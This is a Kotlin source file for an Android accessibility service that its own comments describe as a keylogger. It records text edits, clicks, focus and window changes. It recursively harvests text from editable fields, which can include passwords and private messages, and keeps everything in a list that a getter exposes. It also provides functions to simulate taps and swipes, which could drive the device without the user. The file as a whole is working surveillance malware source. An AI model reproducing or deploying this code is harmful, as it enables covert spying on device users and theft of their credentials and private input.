package com.anti.rootadbcontroller.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * An accessibility service that acts as a keylogger, capturing user interactions
 * such as text input, view clicks, and focus changes. It also provides methods
 * for simulating user gestures like taps and swipes. This service requires the
 * accessibility permission to be granted by the user.
 */
class KeyloggerAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "KeyloggerService"
    }

    private val keylogData = mutableListOf<String>()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        val eventText = when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ->
                "Text Changed: ${event.text}"

            AccessibilityEvent.TYPE_VIEW_FOCUSED ->
                "Focused: ${event.className} - ${event.text}"

            AccessibilityEvent.TYPE_VIEW_CLICKED ->
                "Clicked: ${event.className} - ${event.text}"

            AccessibilityEvent.TYPE_VIEW_SELECTED ->
                "Selected: ${event.className} - ${event.text}"

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED ->
                "Text Selection: ${event.text}"

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ->
                "Window Changed: ${event.className}"

            else -> ""
        }

        if (eventText.isNotEmpty()) {
            Log.d(TAG, eventText)
            keylogData.add(eventText)
            // In a real application, you might want to save this data or send it somewhere
        }

        // Extract information from the accessibility node tree
        extractNodeInfo(rootInActiveWindow)
    }

    private fun extractNodeInfo(nodeInfo: AccessibilityNodeInfo?) {
        if (nodeInfo == null) return

        // Check if this node has editable text that might contain sensitive information
        if (nodeInfo.text != null && nodeInfo.isEditable) {
            val capturedText = "Captured from ${nodeInfo.className}: ${nodeInfo.text}"
            Log.d(TAG, capturedText)
            keylogData.add(capturedText)
        }

        // Recursively process child nodes
        for (i in 0 until nodeInfo.childCount) {
            val childNode = nodeInfo.getChild(i)
            if (childNode != null) {
                extractNodeInfo(childNode)
                childNode.recycle()
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Keylogger service connected")
    }

    /**
     * Simulates a tap gesture at the specified screen coordinates.
     * @param x The x-coordinate of the tap.
     * @param y The y-coordinate of the tap.
     */
    fun simulateTap(x: Float, y: Float) {
        val tapPath = Path().apply {
            moveTo(x, y)
        }

        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(tapPath, 0, 50))

        dispatchGesture(gestureBuilder.build(), null, null)
    }

    /**
     * Simulates a swipe gesture between two points on the screen.
     * @param x1 The starting x-coordinate of the swipe.
     * @param y1 The starting y-coordinate of the swipe.
     * @param x2 The ending x-coordinate of the swipe.
     * @param y2 The ending y-coordinate of the swipe.
     * @param duration The duration of the swipe in milliseconds.
     */
    fun simulateSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
        val swipePath = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }

        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(swipePath, 0, duration))

        dispatchGesture(gestureBuilder.build(), null, null)
    }

    /**
     * Retrieves the data collected by the keylogger.
     * @return A list of strings, where each string is a logged event.
     */
    fun getKeylogData(): List<String> {
        return keylogData.toList()
    }

    /**
     * Clears all the data collected by the keylogger.
     */
    fun clearKeylogData() {
        keylogData.clear()
    }
}
